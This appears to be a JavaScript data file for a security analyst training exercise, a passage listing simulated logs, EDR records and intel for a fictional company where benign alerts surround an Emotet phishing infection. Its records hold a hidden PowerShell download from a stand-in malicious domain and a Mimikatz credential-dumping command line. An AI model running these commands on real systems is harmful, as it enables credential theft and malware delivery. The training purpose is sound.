(function () {
  const E = (id, t, source, hostId, event, msg, fields = {}, o = {}) => Object.assign({ id, t, source, hostId, event, msg, fields }, o);
  const ioc = (type, value) => ({ type, value });
  const DOM = 'brightsmile.test';
  const U = (id, name, username, dept, title, manager, location = 'Springfield HQ') => ({ id, name, username, email: username + '@' + DOM, dept, title, manager, location });
  const H = (id, hostname, ip, os, type, userId, dept, criticality, agent = '7.4.1') => ({ id, hostname, ip, os, type, userId, dept, criticality, agent });

  const MAL_SHA = '9b2f4c61d07e83a5c1f90b3d7e4a28c65f1d093ba7e64c82d15f0a39be7c4d21';
  const MIMI_SHA = 'a7c3e19f5d28b04c6e91f3a7d2058bc4e61f9d03a85b7c2e4d19f60b3a8e5c77';

  const users = [
    U('u-emarsh', 'Elena Marsh', 'emarsh', 'Executive', 'Chief Executive Officer', ''),
    U('u-gliu', 'Grace Liu', 'gliu', 'Accounting', 'Accounts Payable Clerk', 'Ruth Adler'),
    U('u-radler', 'Ruth Adler', 'radler', 'Accounting', 'Finance Manager', 'Elena Marsh'),
    U('u-obanks', 'Oliver Banks', 'obanks', 'Sales', 'Account Executive', 'Leah Brown'),
    U('u-lbrown', 'Leah Brown', 'lbrown', 'Sales', 'Sales Director', 'Elena Marsh'),
    U('u-hcole', 'Henry Cole', 'hcole', 'HR', 'HR Coordinator', 'Elena Marsh'),
    U('u-vramos', 'Victor Ramos', 'vramos', 'Warehouse', 'Warehouse Supervisor', 'Elena Marsh', 'Springfield Warehouse'),
    U('u-msingh', 'Maya Singh', 'msingh', 'Marketing', 'Marketing Specialist', 'Elena Marsh'),
    U('u-fgrant', 'Felix Grant', 'fgrant', 'Customer Service', 'Customer Service Rep (new hire)', 'Leah Brown'),
    U('u-dkapoor', 'Dev Kapoor', 'dkapoor', 'IT', 'Systems Administrator', 'Elena Marsh'),
    U('u-akowal', 'Anna Kowalski', 'akowal', 'Purchasing', 'Purchasing Agent', 'Ruth Adler'),
    U('u-jfoster', 'Jonah Foster', 'jfoster', 'Warehouse', 'Shipping Clerk', 'Victor Ramos', 'Springfield Warehouse')
  ];
  const hosts = [
    H('h-dc01', 'DC01', '10.30.1.10', 'Windows Server 2022', 'dc', null, 'IT', 'crown'),
    H('h-fs01', 'FS01', '10.30.1.21', 'Windows Server 2019', 'server', null, 'IT', 'high'),
    H('h-mailgw', 'MAIL-GW01', '10.30.1.30', 'Windows Server 2019', 'server', null, 'IT', 'medium'),
    H('h-bkp01', 'BACKUP01', '10.30.1.50', 'Windows Server 2022', 'server', null, 'IT', 'medium'),
    H('h-web01', 'WEB01', '10.30.2.15', 'Windows Server 2022', 'server', null, 'IT', 'high'),
    H('h-fw01', 'FW-VPN01', '10.30.0.1', 'PAN-OS 11.1', 'network', null, 'IT', 'high'),
    H('h-scan01', 'SCAN01', '10.30.9.15', 'Windows Server 2022', 'server', null, 'IT', 'medium'),
    H('h-prn01', 'OFC-PRN-01', '10.30.3.50', 'Printer firmware 4.2', 'network', null, 'Facilities', 'low', 'n/a'),
    H('h-acc-012', 'ACC-LT-012', '10.30.4.12', 'Windows 11 Pro', 'laptop', 'u-gliu', 'Accounting', 'medium'),
    H('h-sal-007', 'SAL-WS-007', '10.30.5.7', 'Windows 11 Pro', 'workstation', 'u-obanks', 'Sales', 'low'),
    H('h-hr-003', 'HR-LT-003', '10.30.7.3', 'Windows 11 Pro', 'laptop', 'u-hcole', 'HR', 'medium'),
    H('h-wh-002', 'WH-WS-002', '10.30.11.2', 'Windows 10 Enterprise', 'workstation', 'u-vramos', 'Warehouse', 'low'),
    H('h-mkt-005', 'MKT-WS-005', '10.30.8.5', 'Windows 11 Pro', 'workstation', 'u-msingh', 'Marketing', 'low'),
    H('h-onb-019', 'CSR-LT-019', '10.30.7.19', 'Windows 11 Pro', 'laptop', 'u-fgrant', 'Customer Service', 'low'),
    H('h-it-004', 'IT-LT-004', '10.30.9.44', 'Windows 11 Enterprise', 'laptop', 'u-dkapoor', 'IT', 'medium')
  ];

  const win = (id, t, hostId, code, name, msg, user, o = {}) => E(id, t, 'WinEvent', hostId, code + ' ' + name, 'EventID=' + code + ' ' + msg, Object.assign({ code }, o.f || {}), Object.assign({ user }, o.o || {}));
  const events = [
    // ---- A-4001 expired password lockout (hcole)
    win('e-401', '07:52:10', 'h-hr-003', 4625, 'Logon failed', 'LogonType=2 TargetUserName=hcole WorkstationName=HR-LT-003 Status=0xC000006D SubStatus=0xC0000071 (password expired)', 'hcole'),
    win('e-402', '07:52:41', 'h-hr-003', 4625, 'Logon failed', 'LogonType=2 TargetUserName=hcole WorkstationName=HR-LT-003 Status=0xC000006D SubStatus=0xC0000071 (password expired)', 'hcole'),
    win('e-403', '07:55:03', 'h-dc01', 4740, 'Account lockout', 'A user account was locked out. TargetUserName=hcole CallerComputerName=HR-LT-003', 'hcole'),
    win('e-404', '08:03:20', 'h-dc01', 4724, 'Password reset', "An attempt was made to reset an account's password. Subject: CORP\\swhitaker Target: CORP\\hcole Ticket=INC-30412 (password expired, caller verified)", 'swhitaker', { f: { ticket: 'INC-30412' } }),
    win('e-405', '08:05:12', 'h-hr-003', 4624, 'Logon', 'LogonType=2 TargetUserName=hcole WorkstationName=HR-LT-003 Status=Success', 'hcole'),
    // ---- A-4002 new hire first logon (fgrant)
    E('e-411', '08:20:00', 'ITSM', 'h-onb-019', 'Ticket updated', 'ITSM: HR-ONB-2210 "New hire Felix Grant, Customer Service, start date 2026-11-12" laptop CSR-LT-019 issued, account created by IT, manager Leah Brown', { ticket: 'HR-ONB-2210' }, { user: 'swhitaker' }),
    win('e-412', '08:21:30', 'h-dc01', 4720, 'Account created', 'A user account was created. TargetUserName=fgrant Subject: CORP\\swhitaker Ticket=HR-ONB-2210', 'swhitaker', { f: { ticket: 'HR-ONB-2210' } }),
    win('e-413', '08:38:05', 'h-onb-019', 4624, 'Logon', 'LogonType=2 TargetUserName=fgrant WorkstationName=CSR-LT-019 Status=Success (first interactive logon for this account)', 'fgrant'),
    E('e-414', '08:40:10', 'EDR', 'h-onb-019', 'Agent enrolled', 'EDR agent 7.4.1 enrolled CSR-LT-019 hostname matches asset record HR-ONB-2210; Intune compliant=yes', { asset: 'CSR-LT-019' }, { user: 'fgrant' }),
    // ---- A-4003 authorized vuln scan (high)
    E('e-421', '08:30:00', 'ITSM', 'h-scan01', 'Change started', 'ITSM: CHG-5101 "Monthly authenticated vulnerability scan (Tenable) of all internal subnets" started, window 08:30-10:30, approved by CAB', { ticket: 'CHG-5101' }, { user: 'dkapoor' }),
    win('e-422', '08:31:12', 'h-scan01', 4624, 'Logon', 'LogonType=3 TargetUserName=svc-tenable SourceNetworkAddress=10.30.9.15 Status=Success (credentialed scan service account)', 'svc-tenable', { o: { src: '10.30.9.15' } }),
    E('e-423', '08:52:03', 'Firewall', 'h-scan01', 'Allow', 'ALLOW TCP 10.30.9.15:51022 -> 10.30.4.12:445 bytes=2140 app=smb', { action: 'allow', dport: '445' }, { src: '10.30.9.15', dst: '10.30.4.12' }),
    E('e-424', '08:58:40', 'Firewall', 'h-scan01', 'Allow', 'ALLOW TCP 10.30.9.15:51190 -> 10.30.1.10:389 bytes=1880 app=ldap', { action: 'allow', dport: '389' }, { src: '10.30.9.15', dst: '10.30.1.10' }),
    E('e-425', '09:03:30', 'NDR', 'h-scan01', 'Horizontal scan', 'NDR: horizontal port scan detected src=10.30.9.15 (SCAN01) targets=96 hosts ports=22,80,135,139,443,445,3389 duration=6m', { count: '96', scantype: 'horizontal' }, { src: '10.30.9.15' }),
    // ---- A-4004 Windows Update
    E('e-431', '09:27:50', 'DNS', 'h-wh-002', 'DNS Query', 'query: tlu.dl.delivery.mp.microsoft.com IN A from 10.30.11.2 -> NOERROR', { domain: 'tlu.dl.delivery.mp.microsoft.com', rcode: 'NOERROR' }, { user: 'vramos', src: '10.30.11.2' }),
    E('e-432', '09:28:10', 'Proxy', 'h-wh-002', 'HTTP GET', '10.30.11.2 vramos "GET https://tlu.dl.delivery.mp.microsoft.com/filestreamingservice/files/cu-2026-11.cab HTTP/1.1" 206 412884992 "Microsoft-Delivery-Optimization/10.0" cat="Software Updates" action=allowed', { domain: 'tlu.dl.delivery.mp.microsoft.com', bytes_in: '412884992', category: 'Software Updates' }, { user: 'vramos' }),
    E('e-433', '09:30:02', 'EDR', 'h-wh-002', 'ProcessCreate', 'svchost.exe -k netsvcs -p -s wuauserv signed=Microsoft Windows Publisher parent=services.exe', { process: 'svchost.exe', signer: 'Microsoft Windows' }, { user: 'SYSTEM' }),
    win('e-434', '09:33:15', 'h-wh-002', 1151, 'Defender definitions updated', 'Microsoft Defender Antivirus signature version updated to 1.431.220.0 (source: Microsoft Update Server)', 'SYSTEM'),
    // ---- A-4005 newsletter reported
    E('e-441', '09:40:10', 'Email', 'h-mailgw', 'Delivered', 'Delivered from=newsletter@prodentweekly.example to=msingh@brightsmile.test subject="This week in dental supply: new sterilization guidelines" spf=pass dkim=pass dmarc=pass sender_ip=198.51.100.60 list-unsubscribe=present verdict=clean bulk=yes', { sender: 'newsletter@prodentweekly.example', spf: 'pass', dkim: 'pass', dmarc: 'pass', verdict: 'clean', bulk: 'yes' }, { user: 'msingh', src: '198.51.100.60' }),
    E('e-442', '09:50:22', 'Email', 'h-mailgw', 'UserReport', 'User-reported message via Report Phish button: reporter=msingh@brightsmile.test reason="too many marketing emails"', { reporter: 'msingh' }, { user: 'msingh' }),
    E('e-443', '09:50:40', 'Email', 'h-mailgw', 'URL detonation', 'Sandbox: 4 URLs detonated, all resolve to prodentweekly.example (trade publication); attachments=0 verdict=clean', { verdict: 'clean', domain: 'prodentweekly.example' }, { user: 'msingh' }),
    E('e-444', '09:51:10', 'Email', 'h-mailgw', 'Subscription record', 'Mail GW: sender prodentweekly.example is on the Marketing newsletter allowlist (subscription requested by msingh@brightsmile.test on 2026-03-02)', { allowlisted: 'yes' }, { user: 'msingh' }),
    // ---- TP chain: gliu / ACC-LT-012
    E('e-451', '09:58:14', 'Email', 'h-mailgw', 'Delivered', 'Delivered from="Elena Marsh <invoices@brightsmi1e.test>" to=gliu@brightsmile.test subject="URGENT unpaid invoice 8841 - open attached" reply-to=pay-now@secure-invoice-portal.test spf=fail dkim=none dmarc=fail sender_ip=203.0.113.66 attachment=Invoice_8841.zip tag=[EXTERNAL] verdict=delivered_with_warning', { sender: 'invoices@brightsmi1e.test', recipient: 'gliu@brightsmile.test', subject: 'URGENT unpaid invoice 8841 - open attached', spf: 'fail', dkim: 'none', dmarc: 'fail', attachment: 'Invoice_8841.zip' }, { user: 'gliu', src: '203.0.113.66' }),
    E('e-452', '10:07:40', 'EDR', 'h-acc-012', 'FileCreate', 'FileCreate C:\\Users\\gliu\\Downloads\\Invoice_8841.zip pid=5230 (OUTLOOK.EXE) size=204800', { process: 'OUTLOOK.EXE', path: 'C:\\Users\\gliu\\Downloads\\Invoice_8841.zip' }, { user: 'gliu' }),
    E('e-453', '10:08:55', 'EDR', 'h-acc-012', 'FileCreate', 'FileCreate C:\\Users\\gliu\\Downloads\\Invoice_8841\\Invoice_8841.pdf.exe pid=4120 (explorer.exe) signed=no sha256=' + MAL_SHA, { process: 'explorer.exe', path: 'C:\\Users\\gliu\\Downloads\\Invoice_8841\\Invoice_8841.pdf.exe', sha256: MAL_SHA, signed: 'no' }, { user: 'gliu' }),
    E('e-454', '10:09:12', 'EDR', 'h-acc-012', 'ProcessCreate', 'Invoice_8841.pdf.exe parent=explorer.exe(4120) pid=7712 signed=no (double extension .pdf.exe)', { process: 'Invoice_8841.pdf.exe', parent: 'explorer.exe' }, { user: 'gliu' }),
    E('e-455', '10:09:16', 'EDR', 'h-acc-012', 'Malware detection', 'THREAT DETECTED: Trojan.Win32.Emotet (confidence 99%) file=Invoice_8841.pdf.exe sha256=' + MAL_SHA + ' action=quarantine FAILED (file in use), process still running', { family: 'Emotet', sha256: MAL_SHA, action: 'quarantine_failed' }, { user: 'gliu' }),
    E('e-456', '10:09:20', 'DNS', 'h-acc-012', 'DNS Query', 'query: secure-invoice-portal.test IN A from 10.30.4.12 -> 203.0.113.66 NOERROR', { domain: 'secure-invoice-portal.test', answer: '203.0.113.66' }, { user: 'gliu', src: '10.30.4.12', dst: '203.0.113.66' }),
    E('e-457', '10:09:26', 'Proxy', 'h-acc-012', 'HTTP POST', '10.30.4.12 gliu "POST https://secure-invoice-portal.test/gate.php HTTP/1.1" 200 1204 "Mozilla/4.0 (compatible; MSIE 7.0)" cat="Malware / Command and Control (threat feed)" action=allowed', { domain: 'secure-invoice-portal.test', url: 'https://secure-invoice-portal.test/gate.php', category: 'Malware' }, { user: 'gliu', dst: '203.0.113.66' }),
    E('e-458', '10:10:30', 'EDR', 'h-acc-012', 'ProcessCreate', 'cmd.exe /c powershell.exe -nop -w hidden -c "iwr https://secure-invoice-portal.test/m.exe -OutFile C:\\Users\\Public\\mimikatz.exe" parent=Invoice_8841.pdf.exe(7712) pid=7780', { process: 'cmd.exe', parent: 'Invoice_8841.pdf.exe' }, { user: 'gliu' }),
    E('e-459', '10:11:48', 'EDR', 'h-acc-012', 'FileCreate', 'FileCreate C:\\Users\\Public\\mimikatz.exe pid=7804 (powershell.exe) signed=no sha256=' + MIMI_SHA, { process: 'powershell.exe', path: 'C:\\Users\\Public\\mimikatz.exe', sha256: MIMI_SHA }, { user: 'gliu' }),
    win('e-460', '10:13:05', 'h-acc-012', 4688, 'Process', 'NewProcessName=C:\\Users\\Public\\mimikatz.exe CommandLine="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit" ParentProcess=cmd.exe Subject=CORP\\gliu', 'gliu', { f: { process: 'mimikatz.exe' } }),
    E('e-461', '10:13:07', 'EDR', 'h-acc-012', 'LSASS access', 'Process mimikatz.exe(7920) opened lsass.exe with PROCESS_VM_READ GrantedAccess=0x1010 flag=MALICIOUS (credential dumping)', { process: 'mimikatz.exe', target: 'lsass.exe' }, { user: 'gliu' }),
    E('e-462', '10:14:30', 'EDR', 'h-acc-012', 'Malware detection', 'THREAT DETECTED: HackTool.Win32.Mimikatz file=C:\\Users\\Public\\mimikatz.exe sha256=' + MIMI_SHA + ' action=detected (not blocked)', { family: 'Mimikatz', sha256: MIMI_SHA }, { user: 'gliu' }),
    E('e-463', '10:15:00', 'Firewall', 'h-acc-012', 'Allow', 'ALLOW TCP 10.30.4.12:50412 -> 203.0.113.66:443 bytes=3380 app=ssl', { action: 'allow', dport: '443' }, { src: '10.30.4.12', dst: '203.0.113.66', user: 'gliu' }),
    // ---- A-4008 Veeam backup (critical)
    E('e-471', '10:30:00', 'ITSM', 'h-bkp01', 'Change started', 'ITSM: CHG-5103 "Veeam weekly full backup of FS01 shares" started, owner Dev Kapoor, window 10:30-12:30', { ticket: 'CHG-5103' }, { user: 'dkapoor' }),
    win('e-472', '10:31:08', 'h-fs01', 4624, 'Logon', 'LogonType=3 TargetUserName=svc-veeam SourceNetworkAddress=10.30.1.50 Status=Success', 'svc-veeam', { o: { src: '10.30.1.50' } }),
    E('e-473', '10:44:50', 'EDR', 'h-fs01', 'MassFileRead', 'Mass file read: 52,310 files/min process=VeeamAgent.exe (signed Veeam Software Group GmbH) user=CORP\\svc-veeam path=D:\\Shares\\ writes=0', { process: 'VeeamAgent.exe', count: '52310' }, { user: 'svc-veeam' }),
    E('e-474', '10:47:30', 'EDR', 'h-fs01', 'Ransomware heuristic', 'Heuristic detail: READ-only activity, 0 files modified, 0 renamed, 0 new extensions, no ransom note files, no shadow copy deletion', { writes: '0', renames: '0' }, { user: 'svc-veeam' }),
    E('e-475', '10:49:10', 'Backup', 'h-bkp01', 'Job running', 'Veeam: job "FS01 Weekly Full" status=Running progress=41% processed=640 GB (scheduled via CHG-5103)', { job: 'FS01 Weekly Full' }, { user: 'svc-veeam' }),
    // ---- A-4009 VPN failures from internet scanner
    E('e-481', '11:02:11', 'VPN', 'h-fw01', 'Login failed', 'GlobalProtect: login failed user=admin src=203.0.113.77 reason=invalid user/password', { result: 'failed' }, { user: 'admin', src: '203.0.113.77', dst: '10.30.0.1' }),
    E('e-482', '11:07:50', 'VPN', 'h-fw01', 'Login failed', 'GlobalProtect: login failed user=test src=203.0.113.77 reason=invalid user', { result: 'failed' }, { user: 'test', src: '203.0.113.77', dst: '10.30.0.1' }),
    E('e-483', '11:12:33', 'VPN', 'h-fw01', 'Login failed', 'GlobalProtect: login failed user=root src=203.0.113.77 reason=invalid user', { result: 'failed' }, { user: 'root', src: '203.0.113.77', dst: '10.30.0.1' }),
    E('e-484', '11:18:40', 'VPN', 'h-fw01', 'Auth summary', 'GlobalProtect summary src=203.0.113.77 window=20m failed=48 success=0 distinct_usernames=12 valid_directory_users=0 lockouts=0', { failed: '48', success: '0', valid_users: '0' }, { src: '203.0.113.77', dst: '10.30.0.1' }),
    E('e-485', '11:18:55', 'Firewall', 'h-fw01', 'Threat feed', 'Firewall threat feed: 203.0.113.77 tagged "Known mass internet scanner (research, not targeted)" - listed on 400+ networks', { tag: 'mass scanner' }, { src: '203.0.113.77' }),
    // ---- A-4010 printer DNS
    E('e-491', '11:40:05', 'DNS', 'h-prn01', 'DNS Query', 'query: firmware.printworks-cloud.example IN A from 10.30.3.50 -> 198.51.100.120 NOERROR', { domain: 'firmware.printworks-cloud.example' }, { src: '10.30.3.50', dst: '198.51.100.120' }),
    E('e-492', '11:40:08', 'Proxy', 'h-prn01', 'HTTP GET', '10.30.3.50 - "GET https://firmware.printworks-cloud.example/check?model=MFP-C400&fw=4.2 HTTP/1.1" 200 312 "PrintWorks-MFP/4.2" cat="Printers/IoT vendor" action=allowed', { domain: 'firmware.printworks-cloud.example', status: '200' }, { dst: '198.51.100.120' }),
    E('e-493', '11:41:30', 'DNS', 'h-prn01', 'DNS Query', 'query: telemetry.printworks-cloud.example IN A from 10.30.3.50 -> 198.51.100.121 NOERROR', { domain: 'telemetry.printworks-cloud.example' }, { src: '10.30.3.50', dst: '198.51.100.121' }),
    E('e-494', '11:42:00', 'Inventory', 'h-prn01', 'Asset record', 'Asset DB: OFC-PRN-01 = PrintWorks MFP-C400, 2nd floor copy room, owner Facilities, cloud firmware check enabled (asset tag HLG-PRN-007)', { assettag: 'HLG-PRN-007' }, {}),
    // ---- A-4011 patch task on WEB01
    E('e-501', '12:00:00', 'ITSM', 'h-web01', 'Change started', 'ITSM: CHG-5102 "Thursday monthly patching WEB01 (Windows cumulative update + reboot)" started, owner Dev Kapoor, window 12:00-13:00', { ticket: 'CHG-5102' }, { user: 'dkapoor' }),
    win('e-502', '12:10:20', 'h-web01', 4698, 'Scheduled task', 'A scheduled task was created. TaskName=\\Patching\\MonthlyInstall-2026-11 Author=CORP\\svc-patch Command=C:\\Windows\\System32\\UsoClient.exe StartInstall', 'svc-patch', { f: { code: '4698' } }),
    win('e-503', '12:10:25', 'h-web01', 4688, 'Process', 'NewProcessName=C:\\Windows\\System32\\schtasks.exe CommandLine="schtasks /create /tn \\Patching\\MonthlyInstall-2026-11" ParentProcess=ccmexec.exe Subject=CORP\\svc-patch', 'svc-patch'),
    E('e-504', '12:14:45', 'WinEvent', 'h-web01', '1074 Restart scheduled', 'EventID=1074 The process C:\\Windows\\System32\\RuntimeBroker.exe has initiated the restart of WEB01 for reason: Operating System: Recovery (Planned) - patch window CHG-5102', { code: '1074', ticket: 'CHG-5102' }, { user: 'svc-patch' }),
    // ---- A-4012 DLP payroll
    E('e-511', '13:01:10', 'ITSM', 'h-hr-003', 'Ticket updated', 'ITSM: REQ-7781 "Monthly payroll file to PayStream HR (approved external processor, contract 2024-117)" scheduled recurring request owner Henry Cole', { ticket: 'REQ-7781' }, { user: 'hcole' }),
    E('e-512', '13:02:05', 'DLP', 'h-hr-003', 'Policy match', 'DLP: outbound email contains 62 SSN-like patterns, file=payroll_Nov.xlsx to=payroll@paystream-hr.example policy="PII to unapproved recipient" recipient_category=Approved Data Processor', { file: 'payroll_Nov.xlsx', recipient: 'payroll@paystream-hr.example', category: 'Approved Data Processor' }, { user: 'hcole' }),
    E('e-513', '13:02:08', 'Email', 'h-mailgw', 'Delivered', 'Sent from=hcole@brightsmile.test to=payroll@paystream-hr.example subject="Nov payroll file" tls=enforced(1.3) encrypt=portal attachment=payroll_Nov.xlsx verdict=clean', { tls: 'enforced', recipient: 'payroll@paystream-hr.example' }, { user: 'hcole' }),
    E('e-514', '13:02:30', 'DLP', 'h-hr-003', 'Vendor list', 'DLP: payroll@paystream-hr.example domain paystream-hr.example is on Approved Data Processors list (added 2024-06-01 by Compliance)', { listed: 'yes' }, { user: 'hcole' }),
    // ---- A-4013 admin RDP to FS01
    E('e-521', '13:50:00', 'ITSM', 'h-fs01', 'Change started', 'ITSM: CHG-5104 "Expand D: volume on FS01 (+2 TB) via RDP session by Dev Kapoor" window 13:55-14:30, approved by CAB', { ticket: 'CHG-5104' }, { user: 'dkapoor' }),
    win('e-522', '14:00:02', 'h-fs01', 4624, 'Logon', 'LogonType=10 TargetUserName=dkapoor SourceNetworkAddress=10.30.9.44 Status=Success (RDP from IT-LT-004)', 'dkapoor', { o: { src: '10.30.9.44' }, f: { logontype: '10' } }),
    win('e-523', '14:00:03', 'h-fs01', 4672, 'Special privileges', 'Special privileges assigned to new logon. Subject: CORP\\dkapoor Privileges: SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege', 'dkapoor'),
    win('e-524', '14:03:41', 'h-fs01', 4688, 'Process', 'NewProcessName=C:\\Windows\\System32\\diskpart.exe CommandLine="diskpart /s extend_d.txt" Subject=CORP\\dkapoor', 'dkapoor', { f: { process: 'diskpart.exe' } }),
    // ---- A-4014 service account failures after password rotation
    win('e-531', '14:30:11', 'h-web01', 4625, 'Logon failed', 'LogonType=5 TargetUserName=svc-intranet ServiceName=IntranetAppPool Status=0xC000006A (bad password)', 'svc-intranet'),
    win('e-532', '14:32:11', 'h-web01', 4625, 'Logon failed', 'LogonType=5 TargetUserName=svc-intranet ServiceName=IntranetAppPool Status=0xC000006A (bad password)', 'svc-intranet'),
    win('e-533', '14:34:11', 'h-web01', 4625, 'Logon failed', 'LogonType=5 TargetUserName=svc-intranet ServiceName=IntranetAppPool Status=0xC000006A (bad password)', 'svc-intranet'),
    E('e-534', '14:36:00', 'ITSM', 'h-web01', 'Ticket updated', 'ITSM: INC-30455 "Quarterly service account password rotation svc-intranet" password changed by Dev Kapoor at 14:28; IIS app pool credential update pending', { ticket: 'INC-30455' }, { user: 'dkapoor' }),
    win('e-535', '14:44:20', 'h-web01', 4624, 'Logon', 'LogonType=5 TargetUserName=svc-intranet ServiceName=IntranetAppPool Status=Success (app pool credential updated 14:43)', 'svc-intranet')
  ];

  const edr = {
    'h-acc-012': {
      processes: [
        { pid: 4120, ppid: 0, name: 'explorer.exe', cmd: 'C:\\Windows\\explorer.exe', user: 'CORP\\gliu', start: '08:02:11', signed: true, publisher: 'Microsoft Corporation', sha256: 'c4b81e7a02d59f36a1e84b0d73f2c95e1a6d08b3f47e29c5d0a18e63b7f4d920', flag: null, note: 'Normal user shell' },
        { pid: 5230, ppid: 4120, name: 'OUTLOOK.EXE', cmd: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"', user: 'CORP\\gliu', start: '08:03:40', signed: true, publisher: 'Microsoft Corporation', sha256: '1d90e5a4b7c32f68e10d9a54c7b3f208a6e41d95c0b7f3a82e6d14f90b5c7a33', flag: null, note: 'Email client' },
        { pid: 7712, ppid: 4120, name: 'Invoice_8841.pdf.exe', cmd: 'C:\\Users\\gliu\\Downloads\\Invoice_8841\\Invoice_8841.pdf.exe', user: 'CORP\\gliu', start: '10:09:12', signed: false, publisher: '', sha256: MAL_SHA, flag: 'malicious', note: 'Detected as Trojan.Win32.Emotet. Double file extension, unsigned, launched by the user from a ZIP.' },
        { pid: 7780, ppid: 7712, name: 'cmd.exe', cmd: 'cmd.exe /c powershell.exe -nop -w hidden -c "iwr https://secure-invoice-portal.test/m.exe -OutFile C:\\Users\\Public\\mimikatz.exe"', user: 'CORP\\gliu', start: '10:10:30', signed: true, publisher: 'Microsoft Corporation', sha256: '5a2d7e91b04c68f3a1d90e47b3c5f812e6a09d4c71b8e350f2d6a94c0e18b7d5', flag: 'suspicious', note: 'Child of malware process' },
        { pid: 7804, ppid: 7780, name: 'powershell.exe', cmd: 'powershell.exe -nop -w hidden -c "iwr https://secure-invoice-portal.test/m.exe -OutFile C:\\Users\\Public\\mimikatz.exe"', user: 'CORP\\gliu', start: '10:10:32', signed: true, publisher: 'Microsoft Corporation', sha256: '8e41c0d7a95b3f26e18d04a7c9b5f361d02e8a47b6c1f905d3e7a28b4c06f19a', flag: 'suspicious', note: 'Downloads a file from a known-bad domain' },
        { pid: 7920, ppid: 7780, name: 'mimikatz.exe', cmd: 'C:\\Users\\Public\\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit', user: 'CORP\\gliu', start: '10:13:05', signed: false, publisher: '', sha256: MIMI_SHA, flag: 'malicious', note: 'Credential dumping tool (Mimikatz). Read LSASS memory.' },
        { pid: 3980, ppid: 4120, name: 'chrome.exe', cmd: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', user: 'CORP\\gliu', start: '08:15:22', signed: true, publisher: 'Google LLC', sha256: 'f03b9a6d1e75c284b09d3e7a15c6f482a0d9e3b7c51f8a64d20e9b3c7a15f648', flag: null, note: 'Normal browser' }
      ],
      connections: [
        { t: '10:09:20', pid: 7712, proc: 'Invoice_8841.pdf.exe', dst: '203.0.113.66:443', domain: 'secure-invoice-portal.test', proto: 'TCP' },
        { t: '10:10:33', pid: 7804, proc: 'powershell.exe', dst: '203.0.113.66:443', domain: 'secure-invoice-portal.test', proto: 'TCP' },
        { t: '10:15:00', pid: 7712, proc: 'Invoice_8841.pdf.exe', dst: '203.0.113.66:443', domain: 'secure-invoice-portal.test', proto: 'TCP' },
        { t: '08:15:30', pid: 3980, proc: 'chrome.exe', dst: '198.51.100.200:443', domain: 'news.example', proto: 'TCP' }
      ],
      files: [
        { t: '10:07:40', pid: 5230, op: 'create', path: 'C:\\Users\\gliu\\Downloads\\Invoice_8841.zip', sha256: '2e8f1c05a97d3b64e0f21a8c5d97b34e60a1f7c9d28e5b03a416f8d70c2b9e15' },
        { t: '10:08:55', pid: 4120, op: 'create', path: 'C:\\Users\\gliu\\Downloads\\Invoice_8841\\Invoice_8841.pdf.exe', sha256: MAL_SHA },
        { t: '10:11:48', pid: 7804, op: 'create', path: 'C:\\Users\\Public\\mimikatz.exe', sha256: MIMI_SHA }
      ]
    }
  };

  const intel = {
    'secure-invoice-portal.test': { verdict: 'malicious', summary: 'Known Emotet distribution and command-and-control domain. Registered 3 days ago. Flagged by 41/90 engines.', source: 'VirusTotal' },
    '203.0.113.66': { verdict: 'malicious', summary: 'Hosts secure-invoice-portal.test. Known Emotet C2 server and sender of fake invoice emails.', source: 'OTX' },
    [MAL_SHA]: { verdict: 'malicious', summary: 'Trojan.Win32.Emotet dropper masquerading as a PDF (Invoice_*.pdf.exe). Detected by 58/72 engines.', source: 'VirusTotal' },
    [MIMI_SHA]: { verdict: 'malicious', summary: 'Mimikatz credential dumping tool. Used by attackers to steal Windows passwords from memory.', source: 'VirusTotal' },
    'brightsmi1e.test': { verdict: 'malicious', summary: 'Lookalike of brightsmile.test (the letter l replaced with the number 1). Used for spoofed invoice emails. Registered 3 days ago.', source: 'WHOIS' },
    'prodentweekly.example': { verdict: 'benign', summary: 'Dental trade publication newsletter. Long-standing domain, valid SPF/DKIM/DMARC, no detections.', source: 'VirusTotal' },
    '203.0.113.77': { verdict: 'benign', summary: 'Known internet-wide research scanner. Seen probing thousands of networks daily, no successful logins ever attributed.', source: 'OTX' },
    'paystream-hr.example': { verdict: 'benign', summary: 'PayStream HR, approved payroll processor with a signed contract (2024-117).', source: 'Internal' },
    'firmware.printworks-cloud.example': { verdict: 'benign', summary: 'PrintWorks printer vendor cloud (firmware and telemetry). Established domain, no detections.', source: 'VirusTotal' },
    'telemetry.printworks-cloud.example': { verdict: 'benign', summary: 'PrintWorks printer vendor cloud telemetry endpoint.', source: 'VirusTotal' },
    'tlu.dl.delivery.mp.microsoft.com': { verdict: 'benign', summary: 'Microsoft Windows Update delivery network.', source: 'Internal' },
    '10.30.9.15': { verdict: 'benign', summary: 'SCAN01, the company Tenable vulnerability scanner.', source: 'Internal' }
  };

  const changes = [
    { at: '08:30', system: 'SCAN01 / all subnets', desc: 'Monthly authenticated vulnerability scan (Tenable). Expect scan traffic from 10.30.9.15 until 10:30.', owner: 'Dev Kapoor', ticket: 'CHG-5101' },
    { at: '12:00', system: 'WEB01', desc: 'Thursday monthly patching with scheduled tasks and a planned reboot. Window 12:00-13:00.', owner: 'Dev Kapoor', ticket: 'CHG-5102' },
    { at: '10:30', system: 'BACKUP01 / FS01', desc: 'Veeam weekly full backup of FS01 shares. Heavy file reads expected until 12:30.', owner: 'Dev Kapoor', ticket: 'CHG-5103' },
    { at: '13:55', system: 'FS01', desc: 'Expand D: volume by 2 TB (RDP session by Dev Kapoor from IT-LT-004).', owner: 'Dev Kapoor', ticket: 'CHG-5104' },
    { at: '14:20', system: 'WEB01', desc: 'Quarterly service account password rotation for svc-intranet; app pool credentials updated afterwards.', owner: 'Dev Kapoor', ticket: 'INC-30455' }
  ];

  const chat = [
    { at: '08:05', from: 'dana', text: 'Morning! New analyst on the desk today, so be nice to the queue and ask questions. It is a quiet-ish Thursday.' },
    { at: '08:20', from: 'sam', text: 'Heads up from the service desk: new hire Felix Grant starts today, laptop CSR-LT-019. Expect his first logon this morning.' },
    { at: '08:45', from: 'tom', text: 'Coffee run in ten. Anyone want anything? Ask me if you are stuck on an alert, I am happy to look.' },
